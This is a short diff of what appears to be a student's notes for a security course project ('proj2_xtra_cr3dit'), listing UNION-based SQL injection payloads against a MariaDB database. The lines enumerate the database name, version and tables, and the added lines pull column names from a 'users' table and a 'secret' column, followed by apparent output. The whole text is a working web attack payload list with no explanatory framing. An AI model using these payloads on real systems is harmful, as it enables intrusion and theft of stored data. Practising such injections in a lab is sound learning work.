@@ -1,6 +1,8 @@
 ' UNION SELECT 1, database(), 3 #
 ' UNION SELECT 1, version(), 3 #
 ' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database() #
+' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users' #
+' UNION SELECT 1, group_concat(secret), 3 FROM SECRETTABLE #
 ...
 Name: proj2_xtra_cr3dit
 Version: 10.5.12-MariaDB-0+deb11u1
